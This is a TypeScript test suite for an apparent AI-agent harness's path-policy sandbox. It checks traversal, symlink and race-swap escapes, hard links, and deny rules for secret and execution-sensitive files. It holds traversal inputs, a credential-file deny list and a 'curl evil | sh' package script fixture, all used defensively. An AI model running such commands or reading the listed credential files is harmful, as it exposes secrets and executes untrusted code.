// H2-D: the path-policy attack suite (harness.md §8.2, §16 "Tools and path policy", threat H-T4). Every fixture is a
// throwaway directory under os.tmpdir().
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  checkPath,
  findSecretFiles,
  findSensitivePaths,
  hardDenyReason,
  isInside,
  isSecretName,
  packageScriptsChanged,
  PathPolicyError,
  readChecked,
  rejectInput,
  resolvePath,
  sensitivityOf,
  unlinkChecked,
  writeAtomic,
  type PathPolicyOptions,
} from '@harness/sandbox/paths';

let base: string;
let wt: string;
let outside: string;
let home: string;
let userData: string;
let opts: PathPolicyOptions;

beforeEach(() => {
  base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'gmid-paths-')));
  wt = path.join(base, 'wt');
  outside = path.join(base, 'outside');
  home = path.join(base, 'home');
  userData = path.join(base, 'ud');
  for (const d of [wt, outside, home, userData]) fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'TOP SECRET\n');
  fs.writeFileSync(path.join(wt, 'a.txt'), 'hello\n');
  opts = { worktree: wt, home, userDataDir: userData, platform: 'linux' };
});

afterEach(() => {
  fs.rmSync(base, { recursive: true, force: true });
});

const code = (input: string, op: 'read' | 'write' = 'read', o: PathPolicyOptions = opts) => {
  const r = checkPath(input, op, o);
  return r.ok ? 'ok' : r.code;
};

describe('step 1: rejected inputs', () => {
  it.each(['a\0b', '~', '~/x', '~root/.ssh', 'http://example.com/x', 'file:///etc/passwd', 'FILE:x', 'ssh://host/x', ''])('%j is rejected', (input) => {
    expect(rejectInput(input)).not.toBeNull();
    expect(code(input)).toBe('invalid');
  });
  it('a ~ inside a name is a normal path', () => {
    expect(code('backup~')).toBe('ok');
  });
});

describe('steps 2–3: containment', () => {
  it('.. traversal and absolute paths outside are refused', () => {
    expect(code('../outside/secret.txt')).toBe('outside');
    expect(code('sub/../../outside/secret.txt')).toBe('outside');
    expect(code(path.join(outside, 'secret.txt'))).toBe('outside');
    expect(code('/etc/passwd')).toBe('outside');
    expect(code('../wt-evil/x', 'write')).toBe('outside');
  });
  it('a sibling directory sharing the prefix is outside (separator check)', () => {
    fs.mkdirSync(`${wt}-evil`);
    expect(code(`${wt}-evil/x`)).toBe('outside');
  });
  it('absolute and dotted paths inside are fine; rel is worktree-relative', () => {
    const r = resolvePath(path.join(wt, 'sub', '..', 'a.txt'), 'read', opts);
    expect(r.rel).toBe('a.txt');
    expect(r.exists).toBe(true);
    expect(resolvePath('.', 'read', opts).rel).toBe('');
    expect(resolvePath('new/dir/file.ts', 'write', opts)).toMatchObject({ rel: 'new/dir/file.ts', exists: false });
  });
  it('a symlink inside → outside (file) is refused for reads and writes', () => {
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(wt, 'link.txt'));
    expect(code('link.txt')).toBe('outside');
    expect(code('link.txt', 'write')).toBe('outside');
  });
  it('a symlinked directory → outside is refused, also for files that do not exist yet', () => {
    fs.symlinkSync(outside, path.join(wt, 'dir'));
    expect(code('dir/secret.txt')).toBe('outside');
    expect(code('dir/new.txt', 'write')).toBe('outside');
    expect(code('dir/deep/new.txt', 'write')).toBe('outside');
  });
  it('chained symlinks a → b → outside are refused', () => {
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(wt, 'b'));
    fs.symlinkSync(path.join(wt, 'b'), path.join(wt, 'a'));
    expect(code('a')).toBe('outside');
  });
  it('a symlink inside → inside resolves to its target', () => {
    fs.symlinkSync(path.join(wt, 'a.txt'), path.join(wt, 'alias.txt'));
    const r = resolvePath('alias.txt', 'read', opts);
    expect(r.real).toBe(path.join(wt, 'a.txt'));
    expect(r.rel).toBe('a.txt');
  });
  it('dangling and looping symlinks are refused (target unknown)', () => {
    fs.symlinkSync(path.join(outside, 'nope'), path.join(wt, 'dangling'));
    expect(code('dangling', 'write')).toBe('symlink');
    expect(code('dangling/x', 'write')).toBe('symlink');
    fs.symlinkSync(path.join(wt, 'loop2'), path.join(wt, 'loop1'));
    fs.symlinkSync(path.join(wt, 'loop1'), path.join(wt, 'loop2'));
    expect(code('loop1')).toBe('symlink');
  });
  it('a worktree reached through a symlink is compared by realpath', () => {
    fs.symlinkSync(wt, path.join(base, 'wt-link'));
    const o = { ...opts, worktree: path.join(base, 'wt-link') };
    expect(code('a.txt', 'read', o)).toBe('ok');
    expect(code('../outside/secret.txt', 'read', o)).toBe('outside');
  });
  it('isInside: separator prefix, case folding on darwin and win32 only', () => {
    expect(isInside('/a/wt', '/a/wt/x', 'linux')).toBe(true);
    expect(isInside('/a/wt', '/a/wt', 'linux')).toBe(true);
    expect(isInside('/a/wt', '/a/wtx', 'linux')).toBe(false);
    expect(isInside('/Users/A/wt', '/users/a/WT/x', 'darwin')).toBe(true);
    expect(isInside('/Users/A/wt', '/users/a/WT/x', 'linux')).toBe(false);
    expect(isInside('C:\\Repo', 'c:\\repo\\x', 'win32')).toBe(true);
    expect(isInside('/', '/etc', 'linux')).toBe(true);
  });
  it('protected locations are case-folded on darwin', () => {
    const upper = path.join(home.toUpperCase(), '.SSH', 'config');
    expect(hardDenyReason(upper, 'read', { ...opts, platform: 'darwin' })?.code).toBe('protected');
    expect(hardDenyReason(upper, 'read', { ...opts, platform: 'linux' })).toBeNull();
  });
});

describe('step 4: writes (O_NOFOLLOW, temp + rename, hard links)', () => {
  it('writes atomically and leaves no temp file', async () => {
    const p = resolvePath('sub/new.txt', 'write', opts);
    const sha = await writeAtomic(p, 'x\n', opts);
    expect(sha).toMatch(/^[0-9a-f]{64}$/);
    expect(fs.readFileSync(path.join(wt, 'sub/new.txt'), 'utf8')).toBe('x\n');
    expect(fs.readdirSync(path.join(wt, 'sub')).filter((f) => f.startsWith('.gmid-tmp-'))).toEqual([]);
  });
  it('keeps the mode of an existing file', async () => {
    fs.chmodSync(path.join(wt, 'a.txt'), 0o750);
    await writeAtomic(resolvePath('a.txt', 'write', opts), 'y\n', opts);
    expect(fs.statSync(path.join(wt, 'a.txt')).mode & 0o777).toBe(0o750);
  });
  it('final component swapped for a symlink after the check: refused, outside untouched', async () => {
    const p = resolvePath('a.txt', 'write', opts);
    fs.rmSync(path.join(wt, 'a.txt'));
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(wt, 'a.txt'));
    await expect(writeAtomic(p, 'pwned\n', opts)).rejects.toBeInstanceOf(PathPolicyError);
    expect(fs.readFileSync(path.join(outside, 'secret.txt'), 'utf8')).toBe('TOP SECRET\n');
  });
  it('a parent directory swapped for a symlink after the check: refused, nothing written outside', async () => {
    fs.mkdirSync(path.join(wt, 'sub'));
    fs.writeFileSync(path.join(wt, 'sub', 'f.txt'), 'f\n');
    const p = resolvePath('sub/f.txt', 'write', opts);
    fs.renameSync(path.join(wt, 'sub'), path.join(wt, 'sub-old'));
    fs.symlinkSync(outside, path.join(wt, 'sub'));
    await expect(writeAtomic(p, 'pwned\n', opts)).rejects.toBeInstanceOf(PathPolicyError);
    expect(fs.existsSync(path.join(outside, 'f.txt'))).toBe(false);
    expect(fs.readdirSync(outside)).toEqual(['secret.txt']);
  });
  it('a parent swapped for a symlink before a read: refused (the fd path is verified)', async () => {
    fs.mkdirSync(path.join(wt, 'sub'));
    fs.writeFileSync(path.join(wt, 'sub', 'secret.txt'), 'inside\n');
    const p = resolvePath('sub/secret.txt', 'read', opts);
    fs.renameSync(path.join(wt, 'sub'), path.join(wt, 'sub-old'));
    fs.symlinkSync(outside, path.join(wt, 'sub'));
    await expect(readChecked(p, opts, 1 << 20)).rejects.toBeInstanceOf(PathPolicyError);
  });
  it('a file swapped for a symlink before a read: refused by O_NOFOLLOW', async () => {
    const p = resolvePath('a.txt', 'read', opts);
    fs.rmSync(path.join(wt, 'a.txt'));
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(wt, 'a.txt'));
    await expect(readChecked(p, opts, 1 << 20)).rejects.toThrow(/symbolic link/);
  });
  it('a hard-linked file is reported and needs allowHardLink; the other link keeps its content', async () => {
    fs.linkSync(path.join(outside, 'secret.txt'), path.join(wt, 'hl.txt'));
    const p = resolvePath('hl.txt', 'write', opts);
    expect(p.nlink).toBe(2);
    await expect(writeAtomic(p, 'pwned\n', opts)).rejects.toThrow(/hard links/);
    await writeAtomic(p, 'replaced\n', opts, { allowHardLink: true });
    expect(fs.readFileSync(path.join(wt, 'hl.txt'), 'utf8')).toBe('replaced\n');
    expect(fs.readFileSync(path.join(outside, 'secret.txt'), 'utf8')).toBe('TOP SECRET\n');
  });
  it('createOnly refuses an existing file', async () => {
    await expect(writeAtomic(resolvePath('a.txt', 'write', opts), 'x', opts, { createOnly: true })).rejects.toThrow(/exists/);
  });
  it('mkdir -p refuses to create through a directory swapped for an outside symlink', async () => {
    const p = resolvePath('newdir/x/y.txt', 'write', opts);
    fs.symlinkSync(outside, path.join(wt, 'newdir'));
    await expect(writeAtomic(p, 'pwned', opts)).rejects.toBeInstanceOf(PathPolicyError);
    expect(fs.readdirSync(outside)).toEqual(['secret.txt']);
  });
  it('unlinkChecked removes a regular file and refuses through a swapped parent', async () => {
    fs.writeFileSync(path.join(wt, 'gone.txt'), 'x');
    await unlinkChecked(resolvePath('gone.txt', 'write', opts), opts);
    expect(fs.existsSync(path.join(wt, 'gone.txt'))).toBe(false);
    fs.mkdirSync(path.join(wt, 'd'));
    fs.writeFileSync(path.join(wt, 'd', 'secret.txt'), 'x');
    const p = resolvePath('d/secret.txt', 'write', opts);
    fs.renameSync(path.join(wt, 'd'), path.join(wt, 'd-old'));
    fs.symlinkSync(outside, path.join(wt, 'd'));
    await expect(unlinkChecked(p, opts)).rejects.toBeInstanceOf(PathPolicyError);
    expect(fs.existsSync(path.join(outside, 'secret.txt'))).toBe(true);
  });
});

describe('step 5: hard denies', () => {
  it.each([
    ['.env', true],
    ['.env.local', true],
    ['.env.production', true],
    ['.ENV', true],
    ['.env.example', false],
    ['.env.sample', false],
    ['.env.template', false],
    ['cert.pem', true],
    ['server.key', true],
    ['id_rsa', true],
    ['id_rsa.pub', true],
    ['id_ed25519', true],
    ['.npmrc', true],
    ['.netrc', true],
    ['.pypirc', true],
    ['.git-credentials', true],
    ['keys.ts', false],
    ['environment.ts', false],
  ])('isSecretName(%j) = %j', (name, secret) => {
    expect(isSecretName(name)).toBe(secret);
  });
  it('secret files are refused for reads and writes at any depth', () => {
    for (const p of ['.env', 'sub/.env.local', 'deploy/server.key', 'certs/x.pem', '.npmrc', 'a/b/id_rsa']) {
      expect(code(p, 'read')).toBe('secret');
      expect(code(p, 'write')).toBe('secret');
    }
    expect(code('.env.example', 'read')).toBe('ok');
  });
  it('an innocent name that is a symlink to a secret in the worktree is refused', () => {
    fs.writeFileSync(path.join(wt, '.env'), 'GMI_API_KEY=x\n');
    fs.symlinkSync(path.join(wt, '.env'), path.join(wt, 'notes.txt'));
    expect(code('notes.txt')).toBe('secret');
  });
  it('writes to .git/** and the .git pointer file are refused; reads are allowed', () => {
    fs.mkdirSync(path.join(wt, '.git', 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(wt, '.git', 'config'), '[core]\n');
    expect(code('.git/config', 'write')).toBe('git_metadata');
    expect(code('.git/hooks/pre-commit', 'write')).toBe('git_metadata');
    expect(code('.git/config', 'read')).toBe('ok');
    expect(code('vendor/lib/.git/HEAD', 'write')).toBe('git_metadata');
    fs.rmSync(path.join(wt, '.git'), { recursive: true });
    fs.writeFileSync(path.join(wt, '.git'), 'gitdir: /elsewhere\n');
    expect(code('.git', 'write')).toBe('git_metadata');
    expect(code('.GIT/config', 'write')).toBe('git_metadata');
  });
  it('userData and the protected home paths are refused even inside the worktree', () => {
    // A worktree that contains the home (a `root` thread on a home folder): defence in depth.
    const o: PathPolicyOptions = { worktree: home, home, userDataDir: userData, platform: 'linux' };
    for (const p of ['.ssh/config', '.ssh/known_hosts', '.gnupg/pubring.kbx', '.aws/credentials', '.config/gh/hosts.yml', '.factory/auth.json', '.claude.json']) {
      expect(code(p, 'read', o)).toBe('protected');
    }
    expect(code('.config/other/x', 'read', o)).toBe('ok');
    const o2: PathPolicyOptions = { worktree: base, home, userDataDir: userData, platform: 'linux' };
    expect(code('ud/data/harness/harness.sqlite', 'read', o2)).toBe('protected');
    expect(hardDenyReason(path.join(userData, 'secure', 'token.bin'), 'read', opts)?.code).toBe('protected');
  });
  it('hardDenyReason sees through a symlink to a protected place', () => {
    fs.mkdirSync(path.join(home, '.ssh'));
    fs.symlinkSync(path.join(home, '.ssh'), path.join(base, 'keys'));
    expect(hardDenyReason(path.join(base, 'keys', 'config'), 'read', opts)?.code).toBe('protected');
  });
});

describe('step 6: execution-sensitive and instruction files', () => {
  it.each([
    ['.husky/pre-commit', 'always'],
    ['.husky/_/husky.sh', 'always'],
    ['.git/hooks/pre-push', 'always'],
    ['.github/workflows/ci.yml', 'always'],
    ['.github/CODEOWNERS', null],
    ['.envrc', 'always'],
    ['sub/.envrc', 'always'],
    ['.vscode/settings.json', 'always'],
    ['.vscode/tasks.json', 'always'],
    ['.vscode/launch.json', 'always'],
    ['.vscode/extensions.json', null],
    ['package.json', 'package_json'],
    ['packages/a/package.json', 'package_json'],
    ['Makefile', 'always'],
    ['lib/Makefile', 'always'],
    ['build.sh', 'always'],
    ['scripts/build.sh', null],
    ['AGENTS.md', 'always'],
    ['docs/CLAUDE.md', 'always'],
    ['.gmi-desk/instructions.md', 'always'],
    ['.gmi-desk/permissions.json', 'always'],
    ['.mcp.json', 'always'],
    ['src/index.ts', null],
    ['README.md', null],
  ])('sensitivityOf(%j) = %j', (rel, want) => {
    expect(sensitivityOf(rel)).toBe(want);
  });
  it('the in-repo core.hooksPath directory is sensitive', () => {
    expect(sensitivityOf('tools/hooks/pre-commit', 'tools/hooks')).toBe('always');
    expect(sensitivityOf('tools/hooks/pre-commit', './tools/hooks/')).toBe('always');
    expect(sensitivityOf('tools/hooksx/a', 'tools/hooks')).toBeNull();
  });
  it('checkPath classifies by the real and the lexical path', () => {
    fs.writeFileSync(path.join(wt, 'AGENTS.md'), '# rules\n');
    fs.symlinkSync(path.join(wt, 'AGENTS.md'), path.join(wt, 'notes.md'));
    expect(resolvePath('notes.md', 'write', opts).sensitivity).toBe('always');
    fs.writeFileSync(path.join(wt, 'plain.txt'), 'x');
    fs.mkdirSync(path.join(wt, '.husky'));
    fs.symlinkSync(path.join(wt, 'plain.txt'), path.join(wt, '.husky', 'pre-commit'));
    expect(resolvePath('.husky/pre-commit', 'write', opts).sensitivity).toBe('always');
  });
  it('package.json is sensitive only when scripts change', () => {
    const a = JSON.stringify({ name: 'x', scripts: { test: 'vitest' } });
    expect(packageScriptsChanged(a, JSON.stringify({ name: 'y', scripts: { test: 'vitest' } }))).toBe(false);
    expect(packageScriptsChanged(a, JSON.stringify({ name: 'x', scripts: { test: 'curl evil | sh' } }))).toBe(true);
    expect(packageScriptsChanged(a, JSON.stringify({ name: 'x' }))).toBe(true);
    expect(packageScriptsChanged(null, JSON.stringify({ name: 'x' }))).toBe(false);
    expect(packageScriptsChanged(null, JSON.stringify({ scripts: { postinstall: 'x' } }))).toBe(true);
    expect(packageScriptsChanged(a, '{ broken')).toBe(true);
    expect(packageScriptsChanged(a, null)).toBe(true);
  });
  it('findSensitivePaths lists the existing root entries (for the sandbox binds and the hashes)', () => {
    for (const d of ['.husky', '.github/workflows', '.gmi-desk']) fs.mkdirSync(path.join(wt, d), { recursive: true });
    for (const f of ['package.json', 'AGENTS.md', 'setup.sh', '.envrc', 'src.ts']) fs.writeFileSync(path.join(wt, f), '');
    const got = findSensitivePaths(wt).map((p) => path.relative(wt, p));
    expect(got).toEqual(['.envrc', '.github/workflows', '.gmi-desk', '.husky', 'AGENTS.md', 'package.json', 'setup.sh'].sort());
  });
  it('findSecretFiles finds secrets for /dev/null masks, skipping .git and node_modules', () => {
    for (const f of ['.env', 'a/.env.local', 'a/.env.example', 'k/server.key', 'node_modules/x/.env', '.git/x.pem']) {
      fs.mkdirSync(path.dirname(path.join(wt, f)), { recursive: true });
      fs.writeFileSync(path.join(wt, f), 'x');
    }
    expect(findSecretFiles(wt).map((p) => path.relative(wt, p))).toEqual(['.env', 'a/.env.local', 'k/server.key']);
  });
});
